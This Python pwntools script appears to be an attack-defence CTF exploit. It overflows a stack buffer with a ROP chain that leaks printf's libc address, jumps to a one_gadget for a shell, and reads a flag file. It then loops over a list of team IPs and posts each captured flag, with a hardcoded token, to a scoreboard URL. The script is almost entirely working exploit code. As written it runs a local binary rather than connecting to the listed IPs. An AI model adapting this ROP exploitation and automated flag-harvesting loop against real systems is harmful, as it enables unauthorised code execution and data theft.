#!/usr/bin/env python
# coding=utf-8

from pwn import *
import time
import os

context.os = "linux"
context.word_size = 64
context.endian = "little"
context.arch = "x86_64"
context.terminal = ['deepin-terminal','-x','sh','-c']
#context.log_level = "debug"

ips = ['192.168.1.140', '192.168.1.141', '192.168.1.142', '192.168.1.143', '192.168.1.144', '192.168.1.145', '192.168.1.146', '192.168.1.147', '192.168.1.148', '192.168.1.149']


def exp(ip):
	print ip
	one_gadget_addr = 0xF2519 # local: F1698
	io = process("./bin")
	elf = ELF("./bin")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.24.so")
	#gdb.attach(io,"b *0x400F9A")
	io.readuntil("what you name?")
	payload = "\x00"*0x20 + p64(0x604000) + p64(0x401a23) + p64(elf.got["printf"]) + p64(elf.plt["puts"]) + p64(0x400F3C)
	io.writeline(payload)
	io.readline()
	libc_base = u64(io.readline().strip().ljust(8,'\x00')) - libc.symbols["printf"]
	print "libc_base->",hex(libc_base)
	one_gadget = libc_base + 0xF0274
	io.readuntil("what you name?")
	payload = "\x00"*0x20 + p64(0x604000) + p64(one_gadget)
	io.writeline(payload)

	io.writeline("cat /home/pwn/flag")


	flag = ''
	# flag += io.readline()
	flag += io.readline()

	return flag.strip()
	# print flag
	# io.close()





def submitflag(flag):
    print 456,flag
    url = "http://192.168.1.110:3000/Flag/submit"
    print requests.post(url, data={'flag': flag, 'token': '4928c834a9509772ec1cd7c89f0394c91744a5b1c150af3ffde3ee2002c8a58c'}).content


if __name__ == '__main__':
    while True:
        for ip in ips:
            print ip
            try:
                flag = exp(ip)
                submitflag(flag) 
            except:
                pass
        time.sleep(10)




